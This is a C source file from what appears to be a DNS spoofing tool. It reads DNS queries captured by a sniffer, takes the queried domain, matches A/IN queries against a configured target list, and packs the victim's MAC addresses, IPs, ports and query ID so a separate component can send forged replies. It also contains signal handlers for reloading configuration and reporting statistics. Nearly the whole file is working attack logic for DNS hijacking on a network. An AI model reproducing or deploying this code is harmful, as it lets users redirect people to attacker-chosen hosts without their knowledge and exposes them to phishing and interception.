#include "../spoofer_system/spoofer.h"
#include "../spoofer_pool/spo_pool.h"
#include "../spoofer_sniffer/spo_sniffer.h"
#include "../spoofer_config/spo_config.h"
#include "../spoofer_linux/spo_linux.h"
#include "../spoofer_log/spo_log.h"
#include "../spoofer_test/spo_test.h"
#include "spo_spoofer.h"

#define SPO_MAX_DNS_RSP_SIZE (8192)



static void spo_dns_spoofer_to_update(spo_proc_node_t *p_node);
static SPO_RET_STATUS spo_dns_spoof_init_sig();
static void spo_rld_dns_cfg_tmp(int sig, siginfo_t *info, void *p);
static void spo_rld_dns_cfg(int sig, siginfo_t *info, void *p);

static void spo_dns_statis(int sig, siginfo_t *info, void *p);
static SPO_RET_STATUS spo_do_dns_statis();

void spo_snd_dns_statis_info(void *dns_dmn_);
static SPO_RET_STATUS spo_dns_spoof_init_pool(spo_proc_node_t *node);
static SPO_RET_STATUS spo_do_dns_spoofer(int msgid, const u_char *packet, spo_proc_node_t *p_node);
static inline SPO_RET_BOOLEN spo_dns_type_class(const u_char *type_start);
static SPO_RET_STATUS spo_dns_question_host(const u_char *packet, spo_str_t *host);
static SPO_RET_STATUS spo_packeting_dns_hijack_info(
        const u_char *packet, spo_tree_node_t *node, spo_dns_hjk_t *dns_hjk_info);



/**
 *
 *  packet the dns request info. uesed by build response packet.
 *
 *  @param packet, is the packet we catched.
 *
 *  @param node, is the rbt node, saved the response info.
 *
 *  @param dns_hjk_info, used to save the info taht build response packet.
 *
 *  @return int, is the exec status.
 *
 **/

static SPO_RET_STATUS spo_packeting_dns_hijack_info(
        const u_char *packet, spo_tree_node_t *node, spo_dns_hjk_t *dns_hjk_info)
{
    spo_sniff_ether_t *eth = NULL;
    spo_sniff_ip_t *ip = NULL;
    spo_sniff_udp_t *udp = NULL;
    spo_sniff_dns_t *dns = NULL;
    spo_dns_data_t *dns_data = NULL;

    eth = (spo_sniff_ether_t *) packet;

    dns_hjk_info->vlan_targe = 0;

    if (spo_is_802_1q_vlan(packet) == SPO_TRUE) {
        ip = (spo_sniff_ip_t *) (packet + SPO_IP_OFFSET_VLAN);
        udp = (spo_sniff_udp_t *) (packet + SPO_UDP_OFFSET_VLAN);
        dns = (spo_sniff_dns_t *) (packet + SPO_DNS_OFFSET_VLAN);

        dns_hjk_info->vlan_targe = SPO_RUNNING_IN_VLAN;
        dns_hjk_info->vlan_id = ntohs(*((u_short *) (packet + SPO_VLAN_OFFSET)));
    }else {
        ip = (spo_sniff_ip_t *) (packet + SPO_IP_OFFSET);
        udp = (spo_sniff_udp_t *) (packet + SPO_UDP_OFFSET);
        dns = (spo_sniff_dns_t *) (packet + SPO_DNS_OFFSET);

        dns_hjk_info->vlan_targe = 0;
        dns_hjk_info->vlan_id = 0;
    }

    memcpy(dns_hjk_info->src_mac, eth->ether_shost, ETHER_ADDR_LEN);
    memcpy(dns_hjk_info->dst_mac, eth->ether_dhost, ETHER_ADDR_LEN);

    dns_hjk_info->src_address = ip->ip_src.s_addr;
    dns_hjk_info->dst_address = ip->ip_dst.s_addr;
    dns_hjk_info->ip_off = ntohs(ip->ip_off);

    dns_hjk_info->src_port = ntohs(udp->udp_sport);
    dns_hjk_info->dst_port = ntohs(udp->udp_dport);

    dns_hjk_info->dns_id = ntohs(dns->dns_id);
    dns_hjk_info->dns_ques = ntohs(dns->dns_ques);

    dns_data = (spo_dns_data_t *) node->key;
    dns = (spo_sniff_dns_t *) dns_data->data.data;

    dns_hjk_info->dns_flag = ntohs(dns->dns_flag);
    dns_hjk_info->dns_ans = ntohs(dns->dns_ans);
    dns_hjk_info->dns_add = ntohs(dns->dns_add);
    dns_hjk_info->dns_auth = ntohs(dns->dns_auth);

    return SPO_OK;
}


/**
 *
 *  get dns request host.
 *
 *  @param packet, is the packet we catched.
 *
 *  @param host, used save the host.
 *
 *  @return int, is the exec status.
 *
 **/

static SPO_RET_STATUS spo_dns_question_host(const u_char *packet, spo_str_t *host)
{
    register size_t i = 0;
    size_t quer_s = 0;
    u_char *host_start = NULL;

    if (spo_is_802_1q_vlan(packet) == SPO_TRUE) {
        host->data = (u_char *) (packet + SPO_DNS_OFFSET_VLAN + LIBNET_DNS_H + 1);
        host_start = host->data;
        quer_s = spo_packet_size(packet) - 58;
    }else {
        host->data = (u_char *) (packet + SPO_DNS_OFFSET + LIBNET_DNS_H + 1);
        host_start = host->data;
        quer_s = spo_packet_size(packet) - 54;
    }

    for (i = 0; i < quer_s; i++) {
        if (*host_start == 0x00) {
            host->len = i;
            break;
        }

        host_start++;
    }

    if (i >= quer_s) {
        host->data = NULL;
        host->len = 0;
        return SPO_FAILURE;
    }

    return SPO_OK;
}


/**
 *
 *  the dns request's type and class is we need ?
 *
 *  @param type_start, is the start pointer.
 *
 *  @return int, is the exec status.
 *
 **/

static inline SPO_RET_BOOLEN spo_dns_type_class(const u_char *type_start)
{
    if (*((int *)type_start) == 0x01000100) {       /* if dns type not A or dns class not IN*/
        return SPO_TRUE;
    }

    return SPO_FALSE;
}


/**
 *
 *  the spoofer sender. here call the func to finished the job.
 *
 *  @param packet, is the dns packet we catched.
 *
 *  @return int, is the exec status.
 *
 **/

static SPO_RET_STATUS spo_do_dns_spoofer(int msgid, const u_char *packet, spo_proc_node_t *p_node)
{
    spo_str_t host;
    spo_tree_node_t * node  = NULL;
    spo_dns_hjk_t *hjk_info;
    spo_msg_t *msg = NULL;
    spo_bld_pkt_t *bld_pkt = NULL;
    spo_statis_t *statis = NULL;

    spo_init_str(&host);
    spo_dns_question_host(packet, &host);

    if (spo_dns_type_class(host.data + host.len + 1) == SPO_FALSE) return SPO_FAILURE;

    node = spo_tree_match(p_node->dmn_data_header->dns_data, &host, spo_comp_dns_data_dmn);
    if (node == NULL) return SPO_FAILURE;

    statis = ((spo_statis_t *) (((spo_msg_t *) (((spo_dns_data_t *) node->key)->statis))->data));
    statis->total_rcv++;

    msg = (spo_msg_t *) (((spo_dns_data_t *) (node->key))->data_cp.data);
    msg->type = SPO_PKT_MSG_TYPE;
    bld_pkt = (spo_bld_pkt_t *) msg->data;
    bld_pkt->msg_type = SPO_MSG_DNS;
    hjk_info = (spo_dns_hjk_t *) (bld_pkt->bld_data);

    if (spo_packeting_dns_hijack_info(packet, node, hjk_info) == SPO_FAILURE) return SPO_FAILURE;

#if SPO_DEBUG
       printf("match dns domain\n");
#endif

    if ((spo_msgsnd(msgid, msg, bld_pkt->snd_s, IPC_NOWAIT)) == SPO_FAILURE) {
#if SPO_DEBUG
            printf("dns spoofer snd msg err\n");
#endif
        return SPO_FAILURE;
    }

    statis = ((spo_statis_t *) (((spo_msg_t *) (((spo_dns_data_t *) node->key)->statis))->data));
    statis->total_snd++;

    return SPO_OK;
}


/**
 *
 *  dns spoofer init pool.
 *
 * */

static SPO_RET_STATUS spo_dns_spoof_init_pool(spo_proc_node_t *node)
{
    spo_pool_t *pool = NULL;
    spo_log_t *log = NULL;
    size_t size = 0;

    if ((pool = spo_create_pool(8 * 8192)) == NULL) return SPO_FAILURE;
    node->pool = pool;

    if ((node->dns_pkt = spo_palloc(pool, node->cfg->global->max_dns_pkt_s)) == NULL) return SPO_FAILURE;
    node->dns_pkt->type = SPO_PKT_MSG_TYPE;

    /* log */
    size = sizeof(spo_msg_t) + sizeof(spo_log_t) + node->cfg->global->max_log_len;
    if ((node->log = spo_palloc(pool, size)) == NULL) return SPO_FAILURE;
    log = (spo_log_t *) node->log->data;
    log->pid = node->pid;
    log->proc_type = SPO_DNS_SPOOFER;
    log->size = size;

    return SPO_OK;
}


/* - - -- - - --  - - -- - - --  manage   - -- - - - - -- - -- - - - -- - - - - - -- - -*/


void spo_snd_dns_statis_info(void *dns_dmn_)
{
    spo_dns_data_t *dns_dmn = (spo_dns_data_t *) dns_dmn_;
    spo_msg_t *msg = dns_dmn->statis;
    spo_statis_t *statis = (spo_statis_t *) (msg->data);

    if (dns_dmn_ == NULL) return;

    statis->proc_type = SPO_DNS_SPOOFER;
    statis->pid = current->pid;

    if (spo_msgsnd(statis_msgid, msg, statis->size, IPC_NOWAIT) == SPO_FAILURE) {
#if SPO_DEBUG
        printf("hp spoofer snd statis err\n");
        perror("err : \n");
#endif
    }

    statis->total_rcv = 0;
    statis->total_snd = 0;
}


static SPO_RET_STATUS spo_do_dns_statis()
{
    InOrderTraverse(current->dmn_data_header->dns_data->root, spo_snd_dns_statis_info);

    return SPO_OK;
}


static void spo_dns_statis(int sig, siginfo_t *info, void *p)
{
    info = info;
    p = p;

    if (sig == SIGALRM) {
        spo_do_dns_statis();
        alarm(4);
    }
}


static void spo_rld_dns_cfg(int sig, siginfo_t *info, void *p)
{
    info = info;
    p = p;

    if (sig == SIGUSR1) {
#if SPO_DEBUG
        printf("dns spoofers reload dns cfg\n");
#endif
        current->security = 1;
        current->dns_cfg_security = 1;
    }

}


static void spo_rld_dns_cfg_tmp(int sig, siginfo_t *info, void *p)
{
    info = info;
    p = p;

    if (sig == SIGUSR2) {
#if SPO_DEBUG
        printf("dns spoofer reload dns cfg tmp\n");
#endif
        current->security = 1;
        current->dns_cfg_tmp_security = 1;
    }
}


static SPO_RET_STATUS spo_dns_spoof_init_sig()
{
    sigset_t set;
    memset(&set, '\0', sizeof(sigset_t));

    spo_fill_sigmask(&set);

    spo_del_sig_in_set(SIGUSR1, &set);  /* http cfg reload */
    spo_del_sig_in_set(SIGUSR2, &set);  /* http cfg reload */
    spo_del_sig_in_set(SIGALRM, &set);  /* http cfg reload */

    spo_signal_a_sigset(&set);

    spo_signal_a_sig(SIGUSR1, spo_rld_dns_cfg);
    spo_signal_a_sig(SIGUSR2, spo_rld_dns_cfg_tmp);
    spo_signal_a_sig(SIGALRM, spo_dns_statis);

    return SPO_OK;
}


static void spo_dns_spoofer_to_update(spo_proc_node_t *p_node)
{
    if (p_node->security == 1) {
        if (p_node->dns_cfg_security == 1) {
            int ret = spo_reload_dns_data(p_node->cfg, p_node);
            p_node->security = 0;
            p_node->dns_cfg_security = 0;
            if (ret == SPO_FAILURE) {
                char log_info[256] = {'\0'};
                spo_updata_log(SPO_UP_DNS_CFG, log_info);
                spo_do_snd_log_msg(current->log, log_info, SPO_LOG_LEVEL_ERR);
            }
        }
    }
}


/**
 *
 *  dns spoofers working here
 *
 * */

void spo_dns_spoofer(void *proc_infos)
{
    spo_msg_t *msg;
    spo_proc_node_t *p_node = current;

    register int *snd_msgs = &p_node->dns_msgid[1];

    register int rcv_msgid = p_node->hp_msgid[1];
    register int msg_amt = p_node->dns_msgid[0] - 1;
    register int counter = 0;
    size_t size = p_node->cfg->global->max_dns_pkt_s;

#if SPO_SHUTDOWN_DNS_SPOF
    while (1) sleep(100);
#endif

    spo_bind_cpu(p_node->info->cpuid, current->pid);
    spo_dns_spoof_init_sig();
    if (spo_dns_spoof_init_pool(p_node) == SPO_FAILURE) return;
    alarm(4);

    if (proc_infos != NULL) proc_infos = proc_infos;
    msg = p_node->dns_pkt;

    spo_do_snd_log_msg(current->log, "dns spoofer test log", SPO_LOG_LEVEL_MSG);

    while (SPO_TRUE) {
        spo_dns_spoofer_to_update(p_node);
        if (spo_msgrcv(rcv_msgid, msg, size, SPO_PKT_MSG_TYPE, 0) == SPO_FAILURE) continue;
        spo_do_dns_spoofer(snd_msgs[counter], (u_char *) (msg->data), p_node);

        if (++counter > msg_amt) counter = 0;
    }
}

